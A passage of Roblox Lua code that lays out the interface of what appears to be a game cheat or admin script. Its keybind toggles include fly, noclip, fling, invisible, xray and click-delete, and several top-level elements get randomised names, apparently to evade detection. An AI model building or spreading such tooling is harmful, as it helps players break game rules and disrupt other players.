	Aliases = makeSettingsButton("Edit Aliases","rbxassetid://5147488658")
	Aliases.Position = UDim2.new(0, 5, 0, 115)
	Aliases.Size = UDim2.new(1, -10, 0, 25)
	Aliases.Name = "Aliases"
	Aliases.Parent = SettingsHolder

	StayOpen.Name = "StayOpen"
	StayOpen.Parent = SettingsHolder
	StayOpen.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	StayOpen.BorderSizePixel = 0
	StayOpen.BackgroundTransparency = 1
	StayOpen.Position = UDim2.new(0, 5, 0, 30)
	StayOpen.Size = UDim2.new(1, -10, 0, 20)
	StayOpen.Font = Enum.Font.SourceSans
	StayOpen.TextSize = 14
	StayOpen.Text = "Keep Menu Open"
	StayOpen.TextColor3 = Color3.new(1, 1, 1)
	StayOpen.TextXAlignment = Enum.TextXAlignment.Left
	StayOpen.ZIndex = 10
	table.insert(shade2,StayOpen)
	table.insert(text1,StayOpen)

	Button.Name = "Button"
	Button.Parent = StayOpen
	Button.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	Button.BorderSizePixel = 0
	Button.Position = UDim2.new(1, -20, 0, 0)
	Button.Size = UDim2.new(0, 20, 0, 20)
	Button.ZIndex = 10
	table.insert(shade3,Button)

	On.Name = "On"
	On.Parent = Button
	On.BackgroundColor3 = Color3.fromRGB(150, 150, 151)
	On.BackgroundTransparency = 1
	On.BorderSizePixel = 0
	On.Position = UDim2.new(0, 2, 0, 2)
	On.Size = UDim2.new(0, 16, 0, 16)
	On.Font = Enum.Font.SourceSans
	On.FontSize = Enum.FontSize.Size14
	On.Text = ""
	On.TextColor3 = Color3.new(0, 0, 0)
	On.ZIndex = 10

	Positions = makeSettingsButton("Edit/Goto Waypoints","rbxassetid://5147488592")
	Positions.Position = UDim2.new(0, 5, 0, 145)
	Positions.Size = UDim2.new(1, -10, 0, 25)
	Positions.Name = "Waypoints"
	Positions.Parent = SettingsHolder

	EventBind = makeSettingsButton("Edit Event Binds","rbxassetid://5147695474",759)
	EventBind.Position = UDim2.new(0, 5, 0, 205)
	EventBind.Size = UDim2.new(1, -10, 0, 25)
	EventBind.Name = "EventBinds"
	EventBind.Parent = SettingsHolder

	Plugins = makeSettingsButton("Manage Plugins","rbxassetid://5147695474",743)
	Plugins.Position = UDim2.new(0, 5, 0, 175)
	Plugins.Size = UDim2.new(1, -10, 0, 25)
	Plugins.Name = "Plugins"
	Plugins.Parent = SettingsHolder

	Example.Name = "Example"
	Example.Parent = Holder
	Example.BackgroundTransparency = 1
	Example.BorderSizePixel = 0
	Example.Size = UDim2.new(0, 190, 0, 20)
	Example.Visible = false
	Example.Font = Enum.Font.SourceSans
	Example.TextSize = 18
	Example.Text = "Example"
	Example.TextColor3 = Color3.new(1, 1, 1)
	Example.TextXAlignment = Enum.TextXAlignment.Left
	Example.ZIndex = 10
	table.insert(text1,Example)

	Notification.Name = randomString()
	Notification.Parent = PARENT
	Notification.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
	Notification.BorderSizePixel = 0
	Notification.Position = UDim2.new(1, -500, 1, 20)
	Notification.Size = UDim2.new(0, 250, 0, 100)
	Notification.ZIndex = 10
	table.insert(shade1,Notification)

	Title_2.Name = "Title"
	Title_2.Parent = Notification
	Title_2.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Title_2.BorderSizePixel = 0
	Title_2.Size = UDim2.new(0, 250, 0, 20)
	Title_2.Font = Enum.Font.SourceSans
	Title_2.TextSize = 14
	Title_2.Text = "Notification Title"
	Title_2.TextColor3 = Color3.new(1, 1, 1)
	Title_2.ZIndex = 10
	table.insert(shade2,Title_2)
	table.insert(text1,Title_2)

	Text_2.Name = "Text"
	Text_2.Parent = Notification
	Text_2.BackgroundTransparency = 1
	Text_2.BorderSizePixel = 0
	Text_2.Position = UDim2.new(0, 5, 0, 25)
	Text_2.Size = UDim2.new(0, 240, 0, 75)
	Text_2.Font = Enum.Font.SourceSans
	Text_2.TextSize = 16
	Text_2.Text = "Notification Text"
	Text_2.TextColor3 = Color3.new(1, 1, 1)
	Text_2.TextWrapped = true
	Text_2.ZIndex = 10
	table.insert(text1,Text_2)

	CloseButton.Name = "CloseButton"
	CloseButton.Parent = Notification
	CloseButton.BackgroundTransparency = 1
	CloseButton.Position = UDim2.new(1, -20, 0, 0)
	CloseButton.Size = UDim2.new(0, 20, 0, 20)
	CloseButton.Text = ""
	CloseButton.ZIndex = 10

	CloseImage.Parent = CloseButton
	CloseImage.BackgroundColor3 = Color3.new(1, 1, 1)
	CloseImage.BackgroundTransparency = 1
	CloseImage.Position = UDim2.new(0, 5, 0, 5)
	CloseImage.Size = UDim2.new(0, 10, 0, 10)
	CloseImage.Image = "rbxassetid://5054663650"
	CloseImage.ZIndex = 10

	PinButton.Name = "PinButton"
	PinButton.Parent = Notification
	PinButton.BackgroundTransparency = 1
	PinButton.Size = UDim2.new(0, 20, 0, 20)
	PinButton.ZIndex = 10
	PinButton.Text = ""

	PinImage.Parent = PinButton
	PinImage.BackgroundColor3 = Color3.new(1, 1, 1)
	PinImage.BackgroundTransparency = 1
	PinImage.Position = UDim2.new(0, 3, 0, 3)
	PinImage.Size = UDim2.new(0, 14, 0, 14)
	PinImage.ZIndex = 10
	PinImage.Image = "rbxassetid://6234691350"

	Tooltip.Name = randomString()
	Tooltip.Parent = PARENT
	Tooltip.Active = true
	Tooltip.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
	Tooltip.BackgroundTransparency = 0.1
	Tooltip.BorderSizePixel = 0
	Tooltip.Size = UDim2.new(0, 200, 0, 96)
	Tooltip.Visible = false
	Tooltip.ZIndex = 10
	table.insert(shade1,Tooltip)

	Title_3.Name = "Title"
	Title_3.Parent = Tooltip
	Title_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Title_3.BackgroundTransparency = 0.1
	Title_3.BorderSizePixel = 0
	Title_3.Size = UDim2.new(0, 200, 0, 20)
	Title_3.Font = Enum.Font.SourceSans
	Title_3.TextSize = 14
	Title_3.Text = ""
	Title_3.TextColor3 = Color3.new(1, 1, 1)
	Title_3.TextTransparency = 0.1
	Title_3.ZIndex = 10
	table.insert(shade2,Title_3)
	table.insert(text1,Title_3)

	Description.Name = "Description"
	Description.Parent = Tooltip
	Description.BackgroundTransparency = 1
	Description.BorderSizePixel = 0
	Description.Size = UDim2.new(0,180,0,72)
	Description.Position = UDim2.new(0,10,0,18)
	Description.Font = Enum.Font.SourceSans
	Description.TextSize = 16
	Description.Text = ""
	Description.TextColor3 = Color3.new(1, 1, 1)
	Description.TextTransparency = 0.1
	Description.TextWrapped = true
	Description.ZIndex = 10
	table.insert(text1,Description)

	IntroBackground.Name = "IntroBackground"
	IntroBackground.Parent = Holder
	IntroBackground.Active = true
	IntroBackground.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
	IntroBackground.BorderSizePixel = 0
	IntroBackground.Position = UDim2.new(0, 0, 0, 45)
	IntroBackground.Size = UDim2.new(0, 250, 0, 175)
	IntroBackground.ZIndex = 10

	Logo.Name = "Logo"
	Logo.Parent = Holder
	Logo.BackgroundTransparency = 1
	Logo.BorderSizePixel = 0
	Logo.Position = UDim2.new(0, 125, 0, 127)
	Logo.Size = UDim2.new(0, 10, 0, 10)
	Logo.Image = "rbxassetid://1352543873"
	Logo.ImageTransparency = 0
	Logo.ZIndex = 10

	Credits.Name = "Credits"
	Credits.Parent = Holder
	Credits.BackgroundTransparency = 1
	Credits.BorderSizePixel = 0
	Credits.Position = UDim2.new(0, 0, 0.9, 30)
	Credits.Size = UDim2.new(0, 250, 0, 20)
	Credits.Font = Enum.Font.SourceSansLight
	Credits.FontSize = Enum.FontSize.Size18
	Credits.Text = "Edge // Zwolf // Moon // Hunter"
	Credits.TextColor3 = Color3.new(1, 1, 1)
	Credits.ZIndex = 10

	KeybindsFrame.Name = "KeybindsFrame"
	KeybindsFrame.Parent = Settings
	KeybindsFrame.Active = true
	KeybindsFrame.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
	KeybindsFrame.BorderSizePixel = 0
	KeybindsFrame.Position = UDim2.new(0, 0, 0, 175)
	KeybindsFrame.Size = UDim2.new(0, 250, 0, 175)
	KeybindsFrame.ZIndex = 10
	table.insert(shade1,KeybindsFrame)

	Close.Name = "Close"
	Close.Parent = KeybindsFrame
	Close.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Close.BorderSizePixel = 0
	Close.Position = UDim2.new(0, 205, 0, 150)
	Close.Size = UDim2.new(0, 40, 0, 20)
	Close.Font = Enum.Font.SourceSans
	Close.TextSize = 14
	Close.Text = "Close"
	Close.TextColor3 = Color3.new(1, 1, 1)
	Close.ZIndex = 10
	table.insert(shade2,Close)
	table.insert(text1,Close)

	Add.Name = "Add"
	Add.Parent = KeybindsFrame
	Add.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Add.BorderSizePixel = 0
	Add.Position = UDim2.new(0, 5, 0, 150)
	Add.Size = UDim2.new(0, 40, 0, 20)
	Add.Font = Enum.Font.SourceSans
	Add.TextSize = 14
	Add.Text = "Add"
	Add.TextColor3 = Color3.new(1, 1, 1)
	Add.ZIndex = 10
	table.insert(shade2,Add)
	table.insert(text1,Add)

	Delete.Name = "Delete"
	Delete.Parent = KeybindsFrame
	Delete.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Delete.BorderSizePixel = 0
	Delete.Position = UDim2.new(0, 50, 0, 150)
	Delete.Size = UDim2.new(0, 40, 0, 20)
	Delete.Font = Enum.Font.SourceSans
	Delete.TextSize = 14
	Delete.Text = "Clear"
	Delete.TextColor3 = Color3.new(1, 1, 1)
	Delete.ZIndex = 10
	table.insert(shade2,Delete)
	table.insert(text1,Delete)

	Holder_2.Name = "Holder"
	Holder_2.Parent = KeybindsFrame
	Holder_2.BackgroundTransparency = 1
	Holder_2.BorderSizePixel = 0
	Holder_2.Position = UDim2.new(0, 0, 0, 0)
	Holder_2.Size = UDim2.new(0, 250, 0, 145)
	Holder_2.ScrollBarImageColor3 = Color3.fromRGB(78,78,79)
	Holder_2.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Holder_2.CanvasSize = UDim2.new(0, 0, 0, 0)
	Holder_2.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Holder_2.ScrollBarThickness = 0
	Holder_2.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Holder_2.VerticalScrollBarInset = 'Always'
	Holder_2.ZIndex = 10

	Example_2.Name = "Example"
	Example_2.Parent = KeybindsFrame
	Example_2.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Example_2.BorderSizePixel = 0
	Example_2.Size = UDim2.new(0, 10, 0, 20)
	Example_2.Visible = false
	Example_2.ZIndex = 10
	table.insert(shade2,Example_2)

	Text_3.Name = "Text"
	Text_3.Parent = Example_2
	Text_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Text_3.BorderSizePixel = 0
	Text_3.Position = UDim2.new(0, 10, 0, 0)
	Text_3.Size = UDim2.new(0, 240, 0, 20)
	Text_3.Font = Enum.Font.SourceSans
	Text_3.TextSize = 14
	Text_3.Text = "nom"
	Text_3.TextColor3 = Color3.new(1, 1, 1)
	Text_3.TextXAlignment = Enum.TextXAlignment.Left
	Text_3.ZIndex = 10
	table.insert(shade2,Text_3)
	table.insert(text1,Text_3)

	Delete_2.Name = "Delete"
	Delete_2.Parent = Text_3
	Delete_2.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	Delete_2.BorderSizePixel = 0
	Delete_2.Position = UDim2.new(0, 200, 0, 0)
	Delete_2.Size = UDim2.new(0, 40, 0, 20)
	Delete_2.Font = Enum.Font.SourceSans
	Delete_2.TextSize = 14
	Delete_2.Text = "Delete"
	Delete_2.TextColor3 = Color3.new(0, 0, 0)
	Delete_2.ZIndex = 10
	table.insert(shade3,Delete_2)
	table.insert(text2,Delete_2)

	KeybindEditor.Name = randomString()
	KeybindEditor.Parent = PARENT
	KeybindEditor.Active = true
	KeybindEditor.BackgroundTransparency = 1
	KeybindEditor.Position = UDim2.new(0.5, -180, 0, -500)
	KeybindEditor.Size = UDim2.new(0, 360, 0, 20)
	KeybindEditor.ZIndex = 10

	background_2.Name = "background"
	background_2.Parent = KeybindEditor
	background_2.Active = true
	background_2.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
	background_2.BorderSizePixel = 0
	background_2.Position = UDim2.new(0, 0, 0, 20)
	background_2.Size = UDim2.new(0, 360, 0, 185)
	background_2.ZIndex = 10
	table.insert(shade1,background_2)

	Dark_4.Name = "Dark"
	Dark_4.Parent = background_2
	Dark_4.Active = true
	Dark_4.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Dark_4.BorderSizePixel = 0
	Dark_4.Position = UDim2.new(0, 135, 0, 0)
	Dark_4.Size = UDim2.new(0, 2, 0, 185)
	Dark_4.ZIndex = 10
	table.insert(shade2,Dark_4)

	Directions.Name = "Directions"
	Directions.Parent = background_2
	Directions.BackgroundTransparency = 1
	Directions.BorderSizePixel = 0
	Directions.Position = UDim2.new(0, 10, 0, 15)
	Directions.Size = UDim2.new(0, 115, 0, 90)
	Directions.Font = Enum.Font.SourceSans
	Directions.TextSize = 14
	Directions.Text = "Click the button below and press a key/mouse button. Then select what you want to bind it to."
	Directions.TextColor3 = Color3.new(1, 1, 1)
	Directions.TextWrapped = true
	Directions.TextYAlignment = Enum.TextYAlignment.Top
	Directions.ZIndex = 10
	table.insert(text1,Directions)

	BindTo.Name = "BindTo"
	BindTo.Parent = background_2
	BindTo.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	BindTo.BorderSizePixel = 0
	BindTo.Position = UDim2.new(0, 10, 0, 95)
	BindTo.Size = UDim2.new(0, 115, 0, 50)
	BindTo.Font = Enum.Font.SourceSans
	BindTo.TextSize = 16
	BindTo.Text = "Click to bind"
	BindTo.TextColor3 = Color3.new(1, 1, 1)
	BindTo.ZIndex = 10
	table.insert(shade2,BindTo)
	table.insert(text1,BindTo)

	BindTrigger = Instance.new("TextLabel")
	BindTrigger.Name = "TriggerLabel"
	BindTrigger.BackgroundTransparency = 1
	BindTrigger.Position = UDim2.new(0, 10, 0, 155)
	BindTrigger.Size = UDim2.new(0, 45, 0, 20)
	BindTrigger.Font = Enum.Font.SourceSans
	BindTrigger.TextSize = 14
	BindTrigger.Text = "Trigger:"
	BindTrigger.TextColor3 = Color3.new(1, 1, 1)
	BindTrigger.ZIndex = 10
	BindTrigger.TextXAlignment = Enum.TextXAlignment.Left
	BindTrigger.Parent = background_2
	table.insert(text1,BindTrigger)

	BindTriggerSelect = Instance.new("TextButton")
	BindTriggerSelect.Name = "BindTo"
	BindTriggerSelect.Parent = background_2
	BindTriggerSelect.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	BindTriggerSelect.BorderSizePixel = 0
	BindTriggerSelect.Position = UDim2.new(0, 60, 0, 155)
	BindTriggerSelect.Size = UDim2.new(0, 65, 0, 20)
	BindTriggerSelect.Font = Enum.Font.SourceSans
	BindTriggerSelect.TextSize = 16
	BindTriggerSelect.Text = "KeyDown"
	BindTriggerSelect.TextColor3 = Color3.new(1, 1, 1)
	BindTriggerSelect.ZIndex = 10
	table.insert(shade2,BindTriggerSelect)
	table.insert(text1,BindTriggerSelect)

	Add_2.Name = "Add"
	Add_2.Parent = background_2
	Add_2.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Add_2.BorderSizePixel = 0
	Add_2.Position = UDim2.new(0, 310, 0, 20)
	Add_2.Size = UDim2.new(0, 40, 0, 20)
	Add_2.Font = Enum.Font.SourceSans
	Add_2.TextSize = 14
	Add_2.Text = "Add"
	Add_2.TextColor3 = Color3.new(1, 1, 1)
	Add_2.ZIndex = 10
	table.insert(shade2,Add_2)
	table.insert(text1,Add_2)

	Cmdbar_2.Name = "Cmdbar"
	Cmdbar_2.Parent = background_2
	Cmdbar_2.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Cmdbar_2.BorderSizePixel = 0
	Cmdbar_2.Position = UDim2.new(0, 150, 0, 20)
	Cmdbar_2.Size = UDim2.new(0, 150, 0, 20)
	Cmdbar_2.Font = Enum.Font.SourceSans
	Cmdbar_2.TextSize = 14
	Cmdbar_2.TextXAlignment = Enum.TextXAlignment.Left
	Cmdbar_2.TextColor3 = Color3.new(1, 1, 1)
	Cmdbar_2.Text = ""
	Cmdbar_2.ZIndex = 10
	Cmdbar_2.PlaceholderText = "Command"

	Toggles.Name = "Toggles"
	Toggles.Parent = background_2
	Toggles.BackgroundTransparency = 1
	Toggles.BorderSizePixel = 0
	Toggles.Position = UDim2.new(0, 150, 0, 50)
	Toggles.Size = UDim2.new(0, 200, 0, 125)
	Toggles.ScrollBarImageColor3 = Color3.fromRGB(78,78,79)
	Toggles.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Toggles.CanvasSize = UDim2.new(0, 0, 0, 270)
	Toggles.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Toggles.ScrollBarThickness = 8
	Toggles.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Toggles.VerticalScrollBarInset = 'Always'
	Toggles.ZIndex = 10
	table.insert(scroll,Toggles)

	Fly.Name = "Fly"
	Fly.Parent = Toggles
	Fly.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Fly.BorderSizePixel = 0
	Fly.Size = UDim2.new(0, 192, 0, 20)
	Fly.Font = Enum.Font.SourceSans
	Fly.TextSize = 14
	Fly.Text = "    Toggle Fly"
	Fly.TextColor3 = Color3.new(1, 1, 1)
	Fly.TextXAlignment = Enum.TextXAlignment.Left
	Fly.ZIndex = 10
	table.insert(shade2,Fly)
	table.insert(text1,Fly)

	Select_3.Name = "Select"
	Select_3.Parent = Fly
	Select_3.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	Select_3.BorderSizePixel = 0
	Select_3.Position = UDim2.new(0, 152, 0, 0)
	Select_3.Size = UDim2.new(0, 40, 0, 20)
	Select_3.Font = Enum.Font.SourceSans
	Select_3.TextSize = 14
	Select_3.Text = "Add"
	Select_3.TextColor3 = Color3.new(0, 0, 0)
	Select_3.ZIndex = 10
	table.insert(shade3,Select_3)
	table.insert(text2,Select_3)

	Noclip.Name = "Noclip"
	Noclip.Parent = Toggles
	Noclip.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Noclip.BorderSizePixel = 0
	Noclip.Position = UDim2.new(0, 0, 0, 25)
	Noclip.Size = UDim2.new(0, 192, 0, 20)
	Noclip.Font = Enum.Font.SourceSans
	Noclip.TextSize = 14
	Noclip.Text = "    Toggle Noclip"
	Noclip.TextColor3 = Color3.new(1, 1, 1)
	Noclip.TextXAlignment = Enum.TextXAlignment.Left
	Noclip.ZIndex = 10
	table.insert(shade2,Noclip)
	table.insert(text1,Noclip)

	Select_4.Name = "Select"
	Select_4.Parent = Noclip
	Select_4.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	Select_4.BorderSizePixel = 0
	Select_4.Position = UDim2.new(0, 152, 0, 0)
	Select_4.Size = UDim2.new(0, 40, 0, 20)
	Select_4.Font = Enum.Font.SourceSans
	Select_4.TextSize = 14
	Select_4.Text = "Add"
	Select_4.TextColor3 = Color3.new(0, 0, 0)
	Select_4.ZIndex = 10
	table.insert(shade3,Select_4)
	table.insert(text2,Select_4)

	Float.Name = "Float"
	Float.Parent = Toggles
	Float.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Float.BorderSizePixel = 0
	Float.Position = UDim2.new(0, 0, 0, 50)
	Float.Size = UDim2.new(0, 192, 0, 20)
	Float.Font = Enum.Font.SourceSans
	Float.TextSize = 14
	Float.Text = "    Toggle Float"
	Float.TextColor3 = Color3.new(1, 1, 1)
	Float.TextXAlignment = Enum.TextXAlignment.Left
	Float.ZIndex = 10
	table.insert(shade2,Float)
	table.insert(text1,Float)

	Select_5.Name = "Select"
	Select_5.Parent = Float
	Select_5.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	Select_5.BorderSizePixel = 0
	Select_5.Position = UDim2.new(0, 152, 0, 0)
	Select_5.Size = UDim2.new(0, 40, 0, 20)
	Select_5.Font = Enum.Font.SourceSans
	Select_5.TextSize = 14
	Select_5.Text = "Add"
	Select_5.TextColor3 = Color3.new(0, 0, 0)
	Select_5.ZIndex = 10
	table.insert(shade3,Select_5)
	table.insert(text2,Select_5)

	ClickTP.Name = "Click TP"
	ClickTP.Parent = Toggles
	ClickTP.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	ClickTP.BorderSizePixel = 0
	ClickTP.Position = UDim2.new(0, 0, 0, 75)
	ClickTP.Size = UDim2.new(0, 192, 0, 20)
	ClickTP.Font = Enum.Font.SourceSans
	ClickTP.TextSize = 14
	ClickTP.Text = "    Click TP (Hold Key & Click)"
	ClickTP.TextColor3 = Color3.new(1, 1, 1)
	ClickTP.TextXAlignment = Enum.TextXAlignment.Left
	ClickTP.ZIndex = 10
	table.insert(shade2,ClickTP)
	table.insert(text1,ClickTP)

	Select_6.Name = "Select"
	Select_6.Parent = ClickTP
	Select_6.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	Select_6.BorderSizePixel = 0
	Select_6.Position = UDim2.new(0, 152, 0, 0)
	Select_6.Size = UDim2.new(0, 40, 0, 20)
	Select_6.Font = Enum.Font.SourceSans
	Select_6.TextSize = 14
	Select_6.Text = "Add"
	Select_6.TextColor3 = Color3.new(0, 0, 0)
	Select_6.ZIndex = 10
	table.insert(shade3,Select_6)
	table.insert(text2,Select_6)

	ClickDelete.Name = "Click Delete"
	ClickDelete.Parent = Toggles
	ClickDelete.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	ClickDelete.BorderSizePixel = 0
	ClickDelete.Position = UDim2.new(0, 0, 0, 100)
	ClickDelete.Size = UDim2.new(0, 192, 0, 20)
	ClickDelete.Font = Enum.Font.SourceSans
	ClickDelete.TextSize = 14
	ClickDelete.Text = "    Click Delete (Hold Key & Click)"
	ClickDelete.TextColor3 = Color3.new(1, 1, 1)
	ClickDelete.TextXAlignment = Enum.TextXAlignment.Left
	ClickDelete.ZIndex = 10
	table.insert(shade2,ClickDelete)
	table.insert(text1,ClickDelete)

	Select_13.Name = "Select"
	Select_13.Parent = ClickDelete
	Select_13.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	Select_13.BorderSizePixel = 0
	Select_13.Position = UDim2.new(0, 152, 0, 0)
	Select_13.Size = UDim2.new(0, 40, 0, 20)
	Select_13.Font = Enum.Font.SourceSans
	Select_13.TextSize = 14
	Select_13.Text = "Add"
	Select_13.TextColor3 = Color3.new(0, 0, 0)
	Select_13.ZIndex = 10
	table.insert(shade3,Select_13)
	table.insert(text2,Select_13) 

	Xray.Name = "Xray"
	Xray.Parent = Toggles
	Xray.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Xray.BorderSizePixel = 0
	Xray.Position = UDim2.new(0, 0, 0, 125)
	Xray.Size = UDim2.new(0, 192, 0, 20)
	Xray.Font = Enum.Font.SourceSans
	Xray.TextSize = 14
	Xray.Text = "    Toggle Xray"
	Xray.TextColor3 = Color3.new(1, 1, 1)
	Xray.TextXAlignment = Enum.TextXAlignment.Left
	Xray.ZIndex = 10
	table.insert(shade2,Xray)
	table.insert(text1,Xray)

	Select_10.Name = "Select"
	Select_10.Parent = Xray
	Select_10.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	Select_10.BorderSizePixel = 0
	Select_10.Position = UDim2.new(0, 152, 0, 0)
	Select_10.Size = UDim2.new(0, 40, 0, 20)
	Select_10.Font = Enum.Font.SourceSans
	Select_10.TextSize = 14
	Select_10.Text = "Add"
	Select_10.TextColor3 = Color3.new(0, 0, 0)
	Select_10.ZIndex = 10
	table.insert(shade3,Select_10)
	table.insert(text2,Select_10)

	Swim.Name = "Swim"
	Swim.Parent = Toggles
	Swim.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Swim.BorderSizePixel = 0
	Swim.Position = UDim2.new(0, 0, 0, 150)
	Swim.Size = UDim2.new(0, 192, 0, 20)
	Swim.Font = Enum.Font.SourceSans
	Swim.TextSize = 14
	Swim.Text = "    Toggle Swim"
	Swim.TextColor3 = Color3.new(1, 1, 1)
	Swim.TextXAlignment = Enum.TextXAlignment.Left
	Swim.ZIndex = 10
	table.insert(shade2,Swim)
	table.insert(text1,Swim)

	Select_11.Name = "Select"
	Select_11.Parent = Swim
	Select_11.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	Select_11.BorderSizePixel = 0
	Select_11.Position = UDim2.new(0, 152, 0, 0)
	Select_11.Size = UDim2.new(0, 40, 0, 20)
	Select_11.Font = Enum.Font.SourceSans
	Select_11.TextSize = 14
	Select_11.Text = "Add"
	Select_11.TextColor3 = Color3.new(0, 0, 0)
	Select_11.ZIndex = 10
	table.insert(shade3,Select_11)
	table.insert(text2,Select_11)

	Fling.Name = "Fling"
	Fling.Parent = Toggles
	Fling.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Fling.BorderSizePixel = 0
	Fling.Position = UDim2.new(0, 0, 0, 175)
	Fling.Size = UDim2.new(0, 192, 0, 20)
	Fling.Font = Enum.Font.SourceSans
	Fling.TextSize = 14
	Fling.Text = "    Toggle Fling"
	Fling.TextColor3 = Color3.new(1, 1, 1)
	Fling.TextXAlignment = Enum.TextXAlignment.Left
	Fling.ZIndex = 10
	table.insert(shade2,Fling)
	table.insert(text1,Fling)

	Select_12.Name = "Select"
	Select_12.Parent = Fling
	Select_12.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	Select_12.BorderSizePixel = 0
	Select_12.Position = UDim2.new(0, 152, 0, 0)
	Select_12.Size = UDim2.new(0, 40, 0, 20)
	Select_12.Font = Enum.Font.SourceSans
	Select_12.TextSize = 14
	Select_12.Text = "Add"
	Select_12.TextColor3 = Color3.new(0, 0, 0)
	Select_12.ZIndex = 10
	table.insert(shade3,Select_12)
	table.insert(text2,Select_12)

	Invisible.Name = "Invisible"
	Invisible.Parent = Toggles
	Invisible.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Invisible.BorderSizePixel = 0
	Invisible.Position = UDim2.new(0, 0, 0, 200)
	Invisible.Size = UDim2.new(0, 192, 0, 20)
	Invisible.Font = Enum.Font.SourceSans
	Invisible.TextSize = 14
	Invisible.Text = "    Toggle Invisible"
	Invisible.TextColor3 = Color3.new(1, 1, 1)
	Invisible.TextXAlignment = Enum.TextXAlignment.Left
	Invisible.ZIndex = 10
	table.insert(shade2,Invisible)
	table.insert(text1,Invisible)

	Select_14.Name = "Select"
	Select_14.Parent = Invisible
	Select_14.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	Select_14.BorderSizePixel = 0
	Select_14.Position = UDim2.new(0, 152, 0, 0)
	Select_14.Size = UDim2.new(0, 40, 0, 20)
	Select_14.Font = Enum.Font.SourceSans
	Select_14.TextSize = 14
	Select_14.Text = "Add"
	Select_14.TextColor3 = Color3.new(0, 0, 0)
	Select_14.ZIndex = 10
	table.insert(shade3,Select_14)
	table.insert(text2,Select_14)

	Vehiclefly.Name = "VehicleFly"
	Vehiclefly.Parent = Toggles
	Vehiclefly.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Vehiclefly.BorderSizePixel = 0
	Vehiclefly.Position = UDim2.new(0, 0, 0, 225)
	Vehiclefly.Size = UDim2.new(0, 192, 0, 20)
	Vehiclefly.Font = Enum.Font.SourceSans
	Vehiclefly.TextSize = 14
	Vehiclefly.Text = "    Toggle VehicleFly"
	Vehiclefly.TextColor3 = Color3.new(1, 1, 1)
	Vehiclefly.TextXAlignment = Enum.TextXAlignment.Left
	Vehiclefly.ZIndex = 10
	table.insert(shade2,Vehiclefly)
	table.insert(text1,Vehiclefly)

	Select_15.Name = "Select"
	Select_15.Parent = Vehiclefly
	Select_15.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	Select_15.BorderSizePixel = 0
	Select_15.Position = UDim2.new(0, 152, 0, 0)
	Select_15.Size = UDim2.new(0, 40, 0, 20)
	Select_15.Font = Enum.Font.SourceSans
	Select_15.TextSize = 14
	Select_15.Text = "Add"
	Select_15.TextColor3 = Color3.new(0, 0, 0)
	Select_15.ZIndex = 10
	table.insert(shade3,Select_15)
	table.insert(text2,Select_15)

	VehicleNoclip.Name = "VehicleNoclip"
	VehicleNoclip.Parent = Toggles
	VehicleNoclip.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	VehicleNoclip.BorderSizePixel = 0
	VehicleNoclip.Position = UDim2.new(0, 0, 0, 250)
	VehicleNoclip.Size = UDim2.new(0, 192, 0, 20)
	VehicleNoclip.Font = Enum.Font.SourceSans
	VehicleNoclip.TextSize = 14
	VehicleNoclip.Text = "    Toggle VehicleNoclip"
	VehicleNoclip.TextColor3 = Color3.new(1, 1, 1)
	VehicleNoclip.TextXAlignment = Enum.TextXAlignment.Left
	VehicleNoclip.ZIndex = 10
	table.insert(shade2,VehicleNoclip)
	table.insert(text1,VehicleNoclip)

	Select_16.Name = "Select"
	Select_16.Parent = VehicleNoclip
	Select_16.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	Select_16.BorderSizePixel = 0
	Select_16.Position = UDim2.new(0, 152, 0, 0)
	Select_16.Size = UDim2.new(0, 40, 0, 20)
	Select_16.Font = Enum.Font.SourceSans
	Select_16.TextSize = 14
	Select_16.Text = "Add"
	Select_16.TextColor3 = Color3.new(0, 0, 0)
	Select_16.ZIndex = 10
	table.insert(shade3,Select_16)
	table.insert(text2,Select_16)

	shadow_2.Name = "shadow"
	shadow_2.Parent = KeybindEditor
	shadow_2.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
